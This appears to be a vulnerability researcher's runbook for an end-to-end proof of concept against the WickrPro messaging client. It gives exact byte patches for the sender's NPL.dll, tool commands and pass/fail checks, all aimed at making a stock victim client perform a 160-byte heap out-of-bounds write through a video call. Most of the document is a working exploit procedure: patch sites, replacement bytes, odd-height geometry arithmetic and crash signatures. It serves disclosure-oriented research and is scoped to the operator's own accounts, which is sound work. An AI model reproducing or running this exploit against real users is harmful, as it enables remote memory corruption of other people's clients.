# RUNBOOK — end-to-end sender-side PoC (raw I420 + odd chroma height)

**Scope / RoE:** operator's OWN machine, OWN accounts, OWN call. Only the **sending** client is
patched; the victim client is completely unmodified. No unwitting parties, no production fuzzing.

**What it proves:** that a malicious call participant can drive a stock victim's
`WickrPro!0x1406e95d0` into the confirmed heap OOB write — i.e. the last two INFERRED links
(relay/SFU passes the PacketHeader verbatim; the victim routes raw planes to the sink).

## Tools (built + byte-verified against the shipped NPL.dll)
| tool | role |
|---|---|
| `scratch/w3/lead/probe_raw_loader.exe` | 8 passive hit counters (P1–P8), log-only |
| `scratch/w3/lead/rawpub_inject.exe` | the 2-site sender patch + height telemetry |

Both refuse to run if the target bytes don't match, and both restore on `Ctrl+C` / `--unhook`.

## The patch (verified byte-for-byte by the lead)
| site | NPL RVA | original | new | effect |
|---|---|---|---|---|
| 1 | `0x0ef139` | `E8 72 6E 02 00` (`call Scene::appendNode`) | `B0 01 90 90 90` (`mov al,1`) | VpxEncoder is constructed but **never appended** → Serializer gets raw 3-plane I420 → 3 `PacketHeader_Plane` on the wire, and the kind=1 format announce says raw so the victim does not decode |
| 2 | `0x13a6cf` | `48 63 46 1C 48 8D 53 01` | `E9 <rel32> 90 90 90` → trampoline `h_wire=(h>>1)|1` | every serialized plane height becomes **ODD** |

`(h>>1)|1`, **not** `h|1`: the victim bounds-walks `Σ stride·height` against the real payload
(`0x18011f1c0`) and DISCARDS the packet if the declared geometry grows. Halving stays under it.

Expected wire geometry for a 640×480 camera: **Y{640,241} U{320,121} V{320,121}**,
`Σ = 231,680 ≤ 460,800` ⇒ bound passes ⇒ victim `ALLOC_U=(121>>1)*320=19,200` vs
`COPY_U=(320*121)>>1=19,360` ⇒ **160-byte heap OOB write, twice per frame (U and V), ~30×/s.**

---

## Phase 0 — baseline (sender only, no patch)
1. WickrPro running and logged in, **no call active**. Get the PID:
   ```bash
   powershell "Get-Process WickrPro | Select-Object Id,Responding"
   ```
2. Arm the probe, then start a normal video call (camera ON):
   ```bash
   E:\tmp\wickr\scratch\w3\lead\probe_raw_loader.exe <PID>
   ```
3. Record the baseline, then `Ctrl+C`. **Expected BEFORE the patch:**
   - `P4_VpxEnc` ≈ fps (encoder in the graph)
   - `P7/P6 ≈ 1.00` (one plane per media packet — the VP8 blob)
   - `P2_TEARDOWN == 0`

## Phase 1 — apply the patch (sender only)
1. **End the call.** Confirm the bytes are pristine:
   ```bash
   E:\tmp\wickr\scratch\w3\lead\rawpub_inject.exe --verify <PID>
   ```
   Both sites must read `(ORIGINAL)`.
2. Apply **while idle** (site 1 only executes at publish time):
   ```bash
   E:\tmp\wickr\scratch\w3\lead\rawpub_inject.exe <PID>
   ```
3. **Now start a video call** (camera ON). Watch the telemetry line:
   ```
   [heights] last=121  count=...  AND=0x...1 (bit0=1 -> ALL ODD)  OR=0x...
   ```
   - `last` should cycle through odd values ≈ half the real dimensions (e.g. 241 / 121)
   - `AND bit0 == 1` proves **every** serialized height was odd
   - `count` climbing ⇒ the serializer is running

## Phase 2 — go/no-go (sender only, patch applied, call up)
In a second window, with the call still up:
```bash
E:\tmp\wickr\scratch\w3\lead\probe_raw_loader.exe <PID>
```
**Pass criteria, in order:**
1. `P2_TEARDOWN == 0` and `P1_publish_ok == 1` → publish survived the patch
2. `P4_VpxEnc == 0` while `P5_ColorConv ≈ fps` → encoder is out, converter still feeding
3. **`P7/P6 == 3.00`** → three `PacketHeader_Plane` entries per media packet ← **THE GO/NO-GO**
4. telemetry shows odd heights (Phase 1)
5. sender stays alive ≥30 s and hangup/unpublish does not fault

**Only if 1–5 all hold, proceed to Phase 3.**

## Phase 3 — the victim (unmodified client, operator's other account)
1. On the victim side, arm the passive AV catcher (no hot-path breakpoints — those hang media):
   `scratch/w3/lead/probe_passive_av.txt` (cdb `sxe av`), or simply run it and watch for a crash.
2. Place the call between the two accounts; **the victim must be receiving the sender's video**
   (video call, victim subscribed to the sender's stream — camera on the victim side is NOT
   required).
3. Watch for the fault. **Expected:** access violation, type WRITE, inside `WickrPro+0x6e95d0`,
   at `block+alloc` — matching the W1 repro signature.

## Cautions
- **Bandwidth.** Raw I420 replaces ~10 KB VP8 frames with `W*H*3/2` bytes: ~13 MB/s at 640×480×30.
  If the call stalls or drops, lower the capture resolution (a 320×240 / 160×120 camera mode or a
  virtual camera) and retry. This is the most likely cause of a failed run.
- **Effect timing.** Site 1 runs only inside `publish`, so the raw graph appears on the **next**
  video publish. Patch while idle, then start video. Likewise, after restoring you must stop/start
  video to return to VP8.
- **Restore.** `Ctrl+C` on either tool restores its own bytes; `--unhook <PID>` forces it. If in
  doubt, `--verify` and then restart WickrPro.
- **Sender-side risk (INFERRED, watch for it):** periodic bitrate/statistics callbacks may look the
  encoder back up out of the scene and could fault the *sender*. Nothing in `publish` itself does.
  If the sender crashes at ~the bitrate-adaptation interval, that is the cause.

## If Phase 2 fails
- `P4 != 0` → site 1 didn't take effect (patched after publish? restart video).
- `P2 != 0` → publish aborted; restore immediately and re-examine.
- `P7/P6` stays 1.0 with `P4 == 0` → the converter is emitting a single-plane packet; check the
  camera pixel format (the converter's target subtype is the thing that must be 3-plane I420).
- Victim shows nothing while sender-side checks all pass → the remaining INFERRED links are the
  suspects: relay/SFU normalization, or the victim inserting a colorspace converter that rebuilds
  the geometry (`destColorSpace=8`). Instrument the victim's `NPLAVPacketGetDescriptor` /
  `0x14013e430` with the probe pattern to see what geometry actually arrives.
